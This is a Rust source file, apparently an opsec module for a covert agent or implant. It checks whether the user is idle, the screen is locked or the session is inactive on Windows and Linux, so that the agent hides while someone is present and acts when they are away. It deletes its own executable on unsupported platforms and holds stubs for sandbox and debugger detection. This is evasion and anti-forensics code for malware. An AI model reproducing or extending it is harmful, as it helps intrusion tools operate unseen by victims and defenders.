use log::{debug, warn};
use std::process;
use std::time::Instant;
use once_cell::sync::Lazy;
use std::sync::Mutex;

// Opsec mode per default on High risk to ensure maximum security.
// This module is responsible for detecting the current opsec level based on user activity and system state.
// In short, this ensure the agent to be highly paranoid.

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct OpsecState {
    pub mode: AgentMode,
    pub last_transition: std::time::Instant,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OpsecLevel {
    High, // High risk, user present/active or unknown
    Low,  // Low risk, user idle/locked and checks passed
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AgentMode {
    FullOpsec,      // User active, agent is quiet
    BackgroundOpsec // User idle/locked, agent can be more active
}

pub static OPSEC_STATE: Lazy<Mutex<OpsecState>> = Lazy::new(|| Mutex::new(OpsecState {
    mode: AgentMode::FullOpsec,
    last_transition: std::time::Instant::now(),
}));

pub fn detect_opsec_level() -> OpsecLevel {
    debug!("[OPSEC] detect_opsec_level() called");
    #[cfg(target_os = "windows")]
    {
        let idle = is_user_idle_windows();
        debug!("[OPSEC] is_user_idle_windows() returned: {}", idle);
        if idle {
            debug!("[OPSEC] All user presence checks passed: switching to Low Opsec.");
            OpsecLevel::Low
        } else {
            debug!("[OPSEC] User is present or checks failed: staying in High Opsec.");
            OpsecLevel::High
        }
    }
    #[cfg(target_os = "linux")]
    {
        let idle = is_user_idle_linux();
        debug!("[OPSEC] is_user_idle_linux() returned: {}", idle);
        if idle {
            debug!("[OPSEC] Linux X11 idle detected: switching to Low Opsec.");
            OpsecLevel::Low
        } else {
            debug!("[OPSEC] Linux X11 user present or check failed: staying in High Opsec.");
            OpsecLevel::High
        }
    }
    
    // 
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    {
        debug!("[OPSEC] Unsupported platform detected. Self-deleting and exiting.");
        self_delete_and_exit();
    }
}

pub fn determine_agent_mode() -> AgentMode {
    let level = detect_opsec_level();
    debug!("[OPSEC] determine_agent_mode() called, detected level: {:?}", level);
    match detect_opsec_level() {
        OpsecLevel::High => AgentMode::FullOpsec,
        OpsecLevel::Low => AgentMode::BackgroundOpsec,
    }
}

#[cfg(target_os = "windows")]
fn is_user_idle_windows() -> bool {
    use std::ptr;
    use winapi::um::winuser::{GetLastInputInfo, LASTINPUTINFO, GetForegroundWindow};
    use winapi::um::winuser::OpenInputDesktop;
    use winapi::um::wtsapi32::{WTSQuerySessionInformationW, WTS_CURRENT_SESSION, WTSConnectStateClass, WTSActive};
    use winapi::shared::minwindef::{DWORD, FALSE};

    // 1. Check idle time
    unsafe {
        let mut lii = LASTINPUTINFO {
            cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
            dwTime: 0,
        };
        if GetLastInputInfo(&mut lii) != 0 {
            let tick_count = winapi::um::sysinfoapi::GetTickCount();
            let idle_time = tick_count - lii.dwTime;
            debug!("[OPSEC] Idle time: {} ms", idle_time);
            // Only consider idle if more than 5 minutes
            if idle_time <= 5 * 60 * 1000 {
                debug!("[OPSEC] User not idle (idle_time <= 5min).");
                return false;
            }
        } else {
            warn!("[OPSEC] GetLastInputInfo failed, assuming High Opsec.");
            return false;
        }
    }

    // 2. Check if desktop is locked
    unsafe {
        let hdesk = OpenInputDesktop(0, FALSE, 0x0100); // GENERIC_READ
        if hdesk.is_null() {
            debug!("[OPSEC] Desktop is locked or inaccessible.");
            return true;
        }
        debug!("[OPSEC] Desktop is unlocked.");
        // Optionally: CloseHandle(hdesk);
    }

    // 3. Check session state
    unsafe {
        let mut state: *mut WTSConnectStateClass = ptr::null_mut();
        let mut bytes_returned: DWORD = 0;
        let result = WTSQuerySessionInformationW(
            ptr::null_mut(),
            WTS_CURRENT_SESSION,
            0, // WTSConnectState
            &mut state as *mut _ as *mut _,
            &mut bytes_returned,
        );
        if result != 0 && !state.is_null() {
            debug!("[OPSEC] Session state: {:?}", *state);
            if *state != WTSActive {
                debug!("[OPSEC] Session is not active.");
                return true;
            }
        } else {
            warn!("[OPSEC] WTSQuerySessionInformationW failed or state is null.");
        }
    }

    // 4. Foreground window (optional, for extra paranoia)
    unsafe {
        let fg_window = GetForegroundWindow();
        if fg_window.is_null() {
            debug!("[OPSEC] No foreground window detected.");
            return true;
        }
        debug!("[OPSEC] Foreground window present.");
    }

    // If all checks indicate idle/locked, return true (Low Opsec)
    debug!("[OPSEC] All checks indicate user is present or active.");
    false
}

#[cfg(not(target_os = "windows"))]
fn is_user_idle_windows() -> bool {
    debug!("[OPSEC] is_user_idle_windows() called on non-Windows platform.");
    false
}

#[cfg(target_os = "linux")]
fn is_user_idle_linux() -> bool {
    use log::{debug, error};
    use std::ffi::{CString, c_void};
    use std::ptr;
    use libc::{dlopen, dlsym, RTLD_LAZY, c_char, c_ulong, c_int};

    debug!("[OPSEC] is_user_idle_linux() called");

    unsafe {
        // Open libX11
        let x11 = dlopen(b"libX11.so.6\0".as_ptr() as *const c_char, RTLD_LAZY);
        if x11.is_null() {
            error!("[OPSEC] Failed to open libX11.so.6");
            return false;
        }
        // Open libXss
        let xss = dlopen(b"libXss.so.1\0".as_ptr() as *const c_char, RTLD_LAZY);
        if xss.is_null() {
            error!("[OPSEC] Failed to open libXss.so.1");
            return false;
        }

        // Load XOpenDisplay
        let xopen_display: Option<unsafe extern "C" fn(*const c_char) -> *mut c_void> =
            std::mem::transmute(dlsym(x11, b"XOpenDisplay\0".as_ptr() as *const c_char));
        if xopen_display.is_none() {
            error!("[OPSEC] dlsym for XOpenDisplay failed");
            return false;
        }
        let xopen_display = xopen_display.unwrap();

        // Load XDefaultRootWindow
        let xdefault_root_window: Option<unsafe extern "C" fn(*mut c_void) -> c_ulong> =
            std::mem::transmute(dlsym(x11, b"XDefaultRootWindow\0".as_ptr() as *const c_char));
        if xdefault_root_window.is_none() {
            error!("[OPSEC] dlsym for XDefaultRootWindow failed");
            return false;
        }
        let xdefault_root_window = xdefault_root_window.unwrap();

        // Load XScreenSaverAllocInfo
        let xscreensaver_alloc_info: Option<unsafe extern "C" fn() -> *mut c_void> =
            std::mem::transmute(dlsym(xss, b"XScreenSaverAllocInfo\0".as_ptr() as *const c_char));
        if xscreensaver_alloc_info.is_none() {
            error!("[OPSEC] dlsym for XScreenSaverAllocInfo failed");
            return false;
        }
        let xscreensaver_alloc_info = xscreensaver_alloc_info.unwrap();

        // Load XScreenSaverQueryInfo
        let xscreensaver_query_info: Option<unsafe extern "C" fn(*mut c_void, c_ulong, *mut c_void) -> c_int> =
            std::mem::transmute(dlsym(xss, b"XScreenSaverQueryInfo\0".as_ptr() as *const c_char));
        if xscreensaver_query_info.is_none() {
            error!("[OPSEC] dlsym for XScreenSaverQueryInfo failed");
            return false;
        }
        let xscreensaver_query_info = xscreensaver_query_info.unwrap();

        // Open display
        let display = xopen_display(ptr::null());
        if display.is_null() {
            error!("[OPSEC] XOpenDisplay failed (no X11 session?)");
            return false;
        }

        // Get root window
        let root = xdefault_root_window(display);

        // Allocate info struct
        let info = xscreensaver_alloc_info();
        if info.is_null() {
            error!("[OPSEC] XScreenSaverAllocInfo failed");
            return false;
        }

        // Query info
        let res = xscreensaver_query_info(display, root, info);
        if res == 0 {
            error!("[OPSEC] XScreenSaverQueryInfo failed");
            return false;
        }

        // The struct layout for XScreenSaverInfo:
        #[repr(C)]
        struct XScreenSaverInfo {
            window: c_ulong,
            state: c_int,
            kind: c_int,
            til_or_since: c_ulong,
            idle: c_ulong,
            event_mask: c_ulong,
        }

        let xs_info = &*(info as *const XScreenSaverInfo);
        debug!("[OPSEC] X11 idle time: {} ms", xs_info.idle);

        // Consider idle if more than 5 minutes (300_000 ms)
        xs_info.idle > 300_000
    }
}

pub fn is_sandboxed() -> bool {
    // TODO: Implement sandbox detection
    false
}

pub fn is_debugged() -> bool {
    // TODO: Implement debugger detection
    false
}

// Self delete and exit
pub fn self_delete_and_exit() -> ! {
    use std::env;
    use std::fs;

    if let Ok(path) = env::current_exe() {
        let _ = fs::remove_file(&path);
    }
    process::exit(0);
}